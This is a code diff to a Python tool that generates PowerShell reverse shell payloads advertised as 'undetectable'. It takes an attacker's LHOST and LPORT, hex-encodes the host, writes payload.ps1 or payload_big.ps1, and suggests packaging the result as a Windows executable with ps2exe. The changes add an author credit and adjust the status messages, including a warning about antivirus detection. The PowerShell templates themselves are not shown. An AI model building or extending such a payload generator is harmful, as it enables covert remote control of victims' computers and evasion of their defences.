@@ -1,6 +1,7 @@
 import os
 
 os.system("cls||clear")
+print("created by NiekGevers")
 print("1. powershell reverse shell-small")
 print("2. powershell reverse shell-big")
 question = input("choose your undetectable payload 1/2 => ")
@@ -17,8 +18,8 @@ if question == ("1"):
     output.write(line.replace("{lhost}", lhost_hex).replace("{lport}", lport))
   rev_small.close()
   output.close()
-  print("payload generated as payload.ps1")
-  print("now you can convert your payload.ps1 to an executable with ps2exe on windows.")
+  print("[+] payload generated as payload.ps1")
+  print("[*] now you can convert your payload.ps1 to an executable with ps2exe on windows. (more likely to get detected by antivirus!)")
 elif question == ("2"):
   lhost_big = input("LHOST => ")
   lport_big = input("LPORT => ")
@@ -32,7 +33,7 @@ elif question == ("2"):
     output_big.write(line.replace("{lhost}", lhost_big_hex).replace("{lport}", lport_big))
   rev_big.close()
   output_big.close()
-  print("payload generated as payload_big.ps1")
-  print("now you can convert your payload.ps1 to an executable with ps2exe on windows.")
+  print("[+] payload generated as payload_big.ps1")
+  print("[*] now you can convert your payload.ps1 to an executable with ps2exe on windows. (more likely to get detected by antivirus!)")
 else:
   print("please type 1 or 2")
